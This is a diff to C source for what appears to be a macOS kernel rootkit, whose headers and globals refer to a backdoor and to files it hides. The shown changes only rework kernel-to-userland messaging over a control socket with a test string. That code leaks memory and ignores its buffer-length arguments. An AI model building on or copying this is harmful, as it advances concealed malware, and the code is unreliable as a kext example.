@@ -47,6 +47,8 @@
 #include "anti.h"
 #include "backdoor.h"
 
+#define QUEUE_DATA_SIZE 32
+
 extern int g_pid; /* 'anti.c' */
 extern char *files_to_hide[MAX_FILES_TO_HIDE]; /* 'anti.c' */
 extern int current_idx_file_hidden; /* 'anti.c' */
@@ -113,14 +115,17 @@ kern_return_t remove_kctl(void)
 /*
  *	XXX: not used
  */
-kern_return_t queue_userland_data(pid_t pid)
+kern_return_t queue_userland_data(void *data)
 {
-	int ret = 0;
+	kern_return_t ret = KERN_FAILURE;
+	
+	if(data == NULL)
+		return ret;
 	
 	if(g_client_ctl_ref == NULL)
-		return KERN_FAILURE;
+		return ret;
 	
-	ret = ctl_enqueuedata(g_client_ctl_ref, g_client_unit, &pid, sizeof(pid_t), 0);
+	ret = ctl_enqueuedata(g_client_ctl_ref, g_client_unit, data, QUEUE_DATA_SIZE, 0);
 	
 	return ret;
 }
@@ -159,30 +164,16 @@ static errno_t ctl_disconnect(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitin
  */
 static int ctl_get(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t *len)
 {
-	int ret = 0;
-	size_t valsize;
-	void *buf = NULL;
+	int retv = 0;
 	
-	switch(opt) {
-		case 0:
-			valsize = 0;
-			
-			break;
-			
-		default:
-			ret = ENOTSUP;
-			
-			break;
-	}
+	char *test = _MALLOC(QUEUE_DATA_SIZE, M_TEMP, M_WAITOK);
+	memset(test, 0, QUEUE_DATA_SIZE);
+
+	strncpy(test, "testing kernel to userland", QUEUE_DATA_SIZE);
 	
-	if(ret == 0) {
-		*len = valsize;
-		
-		if(data != NULL)
-			bcopy(buf, data, valsize);
-	}
+	retv = queue_userland_data(test);
 	
-	return ret;
+	return retv;
 }
 
 static int ctl_set(kern_ctl_ref ctl_ref, u_int32_t unit, void *unitinfo, int opt, void *data, size_t len)
